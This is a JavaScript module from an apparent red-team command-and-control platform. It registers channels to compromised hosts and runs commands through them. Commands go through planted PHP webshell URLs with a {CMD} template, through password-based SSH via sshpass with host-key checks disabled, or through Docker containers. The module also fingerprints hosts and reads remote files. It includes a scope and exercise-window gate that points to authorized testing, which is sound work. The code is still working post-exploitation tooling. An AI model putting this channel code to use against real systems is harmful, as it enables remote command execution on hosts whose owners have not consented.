/**
 * Shell registry — C2 implant handles as first-class citizens.
 *
 * A "shell" = an operational channel to a compromised host produced by the
 * C2 agent (implant QA-passed + acceptance-stamped). Registered here with
 * its transport; the operator console and stage agents (persistence/postex)
 * execute through it — one transport, three consumers:
 *   1. Frontend terminal (operator types commands, SSH-like)
 *   2. `shell` agent tool (exec/read_file handed to persistence/postex)
 *   3. C2 agent itself (delivery bookkeeping)
 *
 * Authorization: every shell is bound to an authorized target + exercise
 * window (HVV scope file). exec() refuses outside scope — same hard gate
 * as c2-qa.py (exit discipline) but enforced server-side.
 *
 * Transports: 'local'(基准/开发: 命令跑指定沙箱容器) / 'web'({CMD} 模板
 * URL) / 'ssh'(user:pass@host)——CS23-N14: 'plug in later' 失实(web/ssh
 * 已实现, register 校验即在三枚举内)。
 */
import { randomUUID } from 'node:crypto';
import { sandboxConfig } from './sandbox/container.mjs';
import { mkdirSync, writeFileSync, readFileSync } from 'node:fs';
import { dirname as pdirname, join as pathJoin } from 'node:path';
import { execFile } from 'node:child_process';


function parseFormBody(tpl) {
  // "a=1&c={CMD}" → replace {CMD} already done; split into pairs
  const out = {};
  for (const kv of String(tpl).split('&')) {
    const [k, v = ''] = kv.split('=');
    out[decodeURIComponent(k)] = decodeURIComponent(v);
  }
  return out;
}

/** shells by id — persisted to disk on every mutation; replayed on boot. */
const shells = new Map();
// P0-A(五审): 跟随数据目录——此前硬编码生产路径, 隔离实例写穿到
// /var/lib/spectre/tools/c2/shells.json(跨实例状态互渗, 实测发生)。
const SHELL_SNAPSHOT = pathJoin(
  process.env.SPECTRE_DATA_DIR ?? '/var/lib/spectre', 'tools/c2/shells.json');

function persistShells() {
  try {
    mkdirSync(pdirname(SHELL_SNAPSHOT), { recursive: true });
    writeFileSync(SHELL_SNAPSHOT, JSON.stringify([...shells.values()]));
  } catch { /* best-effort; bus audit is the source of truth */ }
}

function loadShells() {
  try {
    const arr = JSON.parse(readFileSync(SHELL_SNAPSHOT, 'utf8'));
    for (const sh of arr) shells.set(sh.id, sh);
    return arr.length;
  } catch { return 0; }
}
// Boot-time replay (restores across runtime restarts)
loadShells();

const MAX_OUT = 64 * 1024;

/** transportRef "user:pass@host[:port]" — CS1-R6: 三处逐字正则收敛。 */
const SSH_REF_RE = /^(.+?):(.*?)@([^:]+)(?::(\d+))?$/;
/** Second-resolution UTC timestamp — CS1-R6: 两处逐字收敛。 */
const isoNow = () => new Date().toISOString().slice(0, 19) + 'Z';

/**
 * Normalize child-process output into the bounded exec result shape
 * (CS1-R7: ssh/local 两分支逐字后处理收敛)。timeout/截断注记由
 * `timeoutNote` 区分远端/容器措辞。
 */
function boundedExecResult(err, so, se, timeoutNote) {
  const stdout = String(so ?? '');
  let stderr = String(se ?? '');
  const code = err ? (err.code ?? 1) : 0;
  if (code === 124 || code === 137) stderr += `\n${timeoutNote}`;
  if (err?.killed) stderr += '\n[timeout]';
  if (err?.code === 'ERR_CHILD_PROCESS_STDIO_MAXBUFFER') {
    stderr += `\n[输出超 ${MAX_OUT}B 截断——管道 head/tail/grep 缩小范围后重取]`;
  }
  return { stdout, stderr, code };
}

/** CS21-1/CS22-F4: shell 审计载荷 → Bus 白名单字段映射适配器。
 * 生产(agent-runtime)与机锁(shell-bus.test)共用本导出——此前测试内
 * 近逐字副本使映射本体回归时机锁仍绿(P0 级修复落在机锁射程外)。
 * summary=kind·shell·target·命令摘要(检索面), detail=JSON 全量(证据面)。 */
export function shellBusAdapter(bus) {
  return {
    emit: (type, payload) => bus.emit({
      type,
      channel: 'c2',
      from: 'shells',
      summary: [payload?.kind, payload?.id, payload?.target,
        String(payload?.cmd ?? '').slice(0, 80)].filter(Boolean).join(' · ').slice(0, 500),
      detail: JSON.stringify(payload),
    }),
  };
}

export function createShellRegistry({ bus, listScope } = {}) {  // CS20-11: wal 死参数删(仅 persistShells 快照持久化)
  const audit = (kind, data) => {
    try { bus?.emit?.('shell-event', { kind, at: new Date().toISOString(), ...data }); } catch { /* bus optional */ }
  };

  function gate(shell) {
    // Server-side authorization: exercise window + target binding.
    const sc = listScope?.() ?? null;
    if (!sc) return { ok: false, error: 'scope 不可读:授权门配置缺失' };
    const now = isoNow();
    const inWindow = sc.window && sc.window.start <= now && now <= sc.window.end;
    const inTargets = Array.isArray(sc.targets) && sc.targets.includes(shell.target);
    if (!sc.targets?.length || !inWindow) return { ok: false, error: '授权门:窗口外或无目标(拒绝)' };
    if (!inTargets) return { ok: false, error: `授权门:目标 ${shell.target} 不在清单(拒绝)` };
    if (shell.expiresAt && now > shell.expiresAt) {
      // R6-F3: 过期是事实终态——懒翻 status 让查重/list 反映真值
      // (此前僵尸 status=active 永久占名, 卡死同名重注册)。
      shell.status = 'expired';
      try { persistShells(); } catch { /* audit 已留痕 */ }
      return { ok: false, error: 'shell 已过期(一次性纪律)' };
    }
    // R6-F1: target 是自由文本标签, 与流量实际目的地零绑定——此前
    // 注册 target=授权名即可把 transportRef 指向任意内网地址(实测
    // 打穿 runtime 自身 /api/health)。推导 web/ssh 的目的地主机并
    // 要求 ∈ targets(精确或点后缀子域); local=平台自有沙箱不校验。
    if (shell.transport === 'web' || shell.transport === 'ssh') {
      const dest = destinationHost(shell);
      if (dest) {
        const ok = (sc.targets || []).some(t => {
          const tt = String(t).toLowerCase();
          const d = dest.toLowerCase();
          return d === tt || d.endsWith('.' + tt);
        });
        if (!ok) {
          return { ok: false, error:
            `授权门:通道目的地 ${dest} 不在目标清单(拒绝)——target 标签与 transportRef 端点不一致` };
        }
      }
    }
    return { ok: true };
  }

  /** R6-F1: 从 transportRef 推导流量实际目的地主机。 */
  function destinationHost(shell) {
    const tr = String(shell.transportRef || '');
    try {
      if (shell.transport === 'web') {
        const [spec0] = tr.split('#');
        const tpl = spec0.startsWith('POST|') ? spec0.slice(5) : spec0;
        const urlPart = tpl.split('|')[0];
        return new URL(urlPart).hostname;
      }
      if (shell.transport === 'ssh') {
        const m = SSH_REF_RE.exec(tr);
        return m ? m[3] : null;
      }
    } catch { return null; }
    return null;
  }

  function register({ name, target, transport = 'web', transportRef = '', note = '', tags = [], createdBy = 'operator', ttlHours = 24 }) {  // CS24-F4: 缺省统一 'web'(routes/tools 同口径)
    const id = 'sh-' + randomUUID().slice(0, 8);
    // 命名规范:<目标>-<面>-<权限> 建议(不强制,但重名/空名拒)
    const nm = String(name || '').trim();
    if (!nm) return { error: 'name 必填(建议格式 目标-面-权限,如 dc8-web-www)' };
    // R6-F3: 过期通道不占名(事实终态, gate 已拒执行)
    const nowIso = isoNow();
    if ([...shells.values()].some(x => x.name === nm && x.status === 'active'
        && !(x.expiresAt && x.expiresAt <= nowIso)))
      return { error: `同名活跃通道已存在: ${nm}(先 close 或换名)` };
    // transportRef 格式校验(register 时拦截,不留到 exec 才爆)
    const tr = String(transportRef || '');
    if (transport === 'web' && !tr.includes('{CMD}'))
      return { error: 'web transportRef 需含 {CMD} 占位(如 http://h/p.php?c={CMD}#MARK)' };
    if (transport === 'ssh' && !SSH_REF_RE.test(tr))
      return { error: 'ssh transportRef 需 user:pass@host[:port]' };
    if (transport === 'local' && !tr)
      return { error: 'local transportRef 需 容器名[:用户] (如 pxlab:www-data)' };
    const sh = {
      id, name: name || id, target, transport, transportRef, note,
      tags: Array.isArray(tags) ? tags.slice(0, 8).map(String) : [],
      createdBy, createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + ttlHours * 3600e3).toISOString(),
      cmdCount: 0, lastActiveAt: null, status: 'active',
      tasks: [],          // tasking history (Mythic): {n, command, code, ms, at}
      host: null, user: null, os: null,  // auto-fingerprint (Sliver session meta)
    };
    shells.set(id, sh); persistShells();
    audit('shell-register', { id, target, transport, createdBy, name: nm });
    return sh;
  }

  function list(f = {}) {
    let out = [...shells.values()];
    if (f.target) out = out.filter(x => x.target === f.target);
    if (f.transport) out = out.filter(x => x.transport === f.transport);
    if (f.tag) out = out.filter(x => (x.tags ?? []).includes(f.tag));
    if (f.name) out = out.filter(x => String(x.name).toLowerCase().includes(String(f.name).toLowerCase()));
    if (f.status) out = out.filter(x => x.status === f.status);
    return out;
  }

  function get(id) { return shells.get(id) ?? null; }

  function close(id) {
    const sh = shells.get(id);
    if (!sh) return { ok: false, error: 'shell 不存在' };
    sh.status = 'closed'; persistShells();
    audit('shell-close', { id });
    return { ok: true };
  }

  /**
   * Execute one command over the shell. Transport 'local' = run inside the
   * configured exec box (docker container) — benchmark-grade fidelity.
   * Returns { ok, stdout, stderr, code, ms }.
   */
  async function exec(id, command, { timeoutMs = 30_000, box: _box = null } = {}) {
    const sh = shells.get(id);
    if (!sh) return { ok: false, error: 'shell 不存在' };
    if (sh.status !== 'active') return { ok: false, error: `shell 状态 ${sh.status}` };
    const g = gate(sh);
    if (!g.ok) return { ok: false, error: g.error };
    const t0 = Date.now();
    let stdout = '', stderr = '', code = 0;
    try {
      if (sh.transport === 'ssh') {
        // transportRef: "user:pass@host:port" — VM range channel (post-creds).
        const m = SSH_REF_RE.exec(sh.transportRef || '');
        if (!m) return { ok: false, error: 'ssh transportRef 需 user:pass@host[:port]' };
        const [, u, pw, h, port] = m;
        const r = await new Promise((resolve) => {
          const tSecS = Math.max(1, Math.ceil(timeoutMs / 1000));
          execFile('sshpass', ['-p', pw, 'ssh', '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null', '-p', port || '22',
            `${u}@${h}`, `timeout -k 5 ${tSecS} bash -lc ` + JSON.stringify(command)],
            { timeout: timeoutMs, maxBuffer: MAX_OUT }, (err, so, se) =>
            resolve({ err, so: String(so ?? ''), se: String(se ?? ''), code: err ? (err.code ?? 1) : 0 }));
        });
        ({ stdout, stderr, code } = boundedExecResult(
          r.err, r.so, r.se, '[timeout: 远端进程已被 timeout(1) 终止]'));
      } else if (sh.transport === 'web') {
        // transportRef: full URL template with {CMD} placeholder, e.g.
        //   http://h/p.php?c={CMD}        (GET; CMD urlencoded)
        //   POST|http://h/p.php|c={CMD}   (POST body form-encoded)
        // Optional response delimiters after '#' as marker: ...{CMD}#MARK
        // — only text between <MARK> and </MARK> is returned (kills the
        // Joomla/WordPress page-prefix noise that caused two misreads).
        const spec = sh.transportRef || '';
        const [spec0, marker] = spec.split('#');
        const isPost = spec0.startsWith('POST|');
        const tpl = isPost ? spec0.slice(5) : spec0;
        // F26: POST 模板形如 "url|c={CMD}" —— url 与 form 段用 | 分隔;
        // 此前整段 tpl 当 fetch url 且 parseFormBody 吃进完整 URL 导致
        // 命令字段丢失(实测 post-ok: 空)。拆开:url 部分 fetch,form 部分
        // 做 body。无 | 时 form 段缺省 c={CMD}。
        const postSplit = isPost ? tpl.split('|') : [];
        const postUrl = isPost ? (postSplit[0] || tpl) : tpl;
        const postForm = isPost ? (postSplit.slice(1).join('|') || 'c={CMD}') : '';
        if (!tpl.includes('{CMD}')) return { ok: false, error: 'web transportRef 需含 {CMD} 占位' };
        const enc = encodeURIComponent(command);
        const url = isPost ? postUrl : tpl.replace('{CMD}', enc);
        const body = isPost ? postForm.replace('{CMD}', enc) : null;
        const ctl = new AbortController();
        const t = setTimeout(() => ctl.abort(), Math.min(timeoutMs, 60_000)); // hard kill
        try {
          const r = await fetch(url, {
            method: isPost ? 'POST' : 'GET',
            body: isPost ? new URLSearchParams(parseFormBody(body)) : undefined,
            headers: isPost ? { 'content-type': 'application/x-www-form-urlencoded' } : {},
            signal: ctl.signal,
          });
          let txt = await r.text();
          clearTimeout(t);
          if (marker) {
            const m1 = txt.indexOf('<' + marker + '>');
            const m2 = txt.indexOf('</' + marker + '>');
            if (m1 >= 0) txt = m2 > m1 ? txt.slice(m1 + marker.length + 2, m2) : txt.slice(m1 + marker.length + 2);
          }
          stdout = txt.slice(0, MAX_OUT); stderr = ''; code = r.ok ? 0 : 1;
        } catch (e) {
          clearTimeout(t);
          return { ok: false, error: 'webshell 通道异常(已硬杀): ' + e.message };
        }
      } else if (sh.transport === 'local') {
        // transportRef binds the shell to ONE exec box — commands land in
        // the compromised box, never the runtime host. Format "container"
        // (default user) or "container:user" (low-priv web compromise).
        // CS20-2: 容器名单源(同 mcp.mjs)——字面量回退仅 legacy 持久化
        // 数据可达, 但同样绕过命名空间契约。
        const ref = sh.transportRef || sandboxConfig().container;
        const [cbox, cuser] = ref.includes(':') ? ref.split(':') : [ref, null];
        // F18: 容器侧 timeout(1) 包裹——node 杀 docker CLI 不杀容器进程
        // (泄漏 bash+sleep),且 docker CLI 被 SIGTERM 后 err 为空导致超时
        // 谎报 code:0 ok:true。容器内 timeout 真杀进程并返回 124。
        const tSec = Math.max(1, Math.ceil(timeoutMs / 1000));
        const argv = cuser
          ? ['exec', '-u', cuser, cbox, 'timeout', '-k', '5', String(tSec), 'bash', '-lc', command]
          : ['exec', cbox, 'timeout', '-k', '5', String(tSec), 'bash', '-lc', command];
        const res = await new Promise((resolve) => {
          execFile('docker', argv, { timeout: timeoutMs + 5_000, maxBuffer: MAX_OUT }, (err, so, se) =>
            resolve({ err, so: String(so ?? ''), se: String(se ?? '') }));
        });
        ({ stdout, stderr, code } = boundedExecResult(
          res.err, res.so, res.se, '[timeout: 容器内进程已被 timeout(1) 终止]'));
      } else {
        return { ok: false, error: `transport ${sh.transport} 未接入(真实植入通道后续挂)` };
      }
    } catch (e) {
      return { ok: false, error: 'exec 异常: ' + e.message };
    }
    sh.cmdCount += 1; sh.lastActiveAt = new Date().toISOString();
    const task = { n: sh.cmdCount, command: command.slice(0, 500), code, ms: Date.now() - t0, at: sh.lastActiveAt };
    sh.tasks.push(task);
    persistShells();  // R6-F2: every-mutation 契约
    if (sh.tasks.length > 100) sh.tasks.splice(0, sh.tasks.length - 100);
    audit('shell-exec', { id, target: sh.target, cmd: command.slice(0, 120), code, ms: task.ms });
    return { ok: code === 0, stdout: stdout.slice(0, MAX_OUT), stderr: stderr.slice(0, MAX_OUT), code, ms: task.ms, task };
  }

  /** Auto-fingerprint the host once (whoami/uname) — Sliver-style session meta. */
  async function fingerprint(id) {
    const sh = shells.get(id);
    if (!sh || sh.host) return sh;
    const u = await exec(id, 'id -un 2>/dev/null; uname -a 2>/dev/null | head -1');
    if (u.ok) {
      const [user, ...rest] = String(u.stdout).split('\n');
      sh.user = (user || '').trim() || null;
      sh.os = rest.join(' ').trim() || null;
      sh.host = sh.os ? String(sh.os).split(' ')[1] : null;
      persistShells();  // R6-F2
    }
    return sh;
  }

  /** Convenience: read one file through the shell (cat), for agent tool. */
  async function readFile(id, path) {
    // R6-F4: 单引号安全转义(双引号内 $()/反引号会展开, path 即注入
    // 点); cat 退出码经 PIPESTATUS 传播——读失败不再被 head 的恒 0
    // 吞掉, 错误文本仍在 stdout 可诊断。
    const q = "'" + String(path).replace(/'/g, `'\\''`) + "'";
    const r = await exec(id,
      `o=$(cat -- ${q} 2>&1); c=$?; printf %s "$o" | head -c 65536; exit $c`);
    return r;
  }

  return { register, list, get, close, exec, readFile, gate, fingerprint };
}
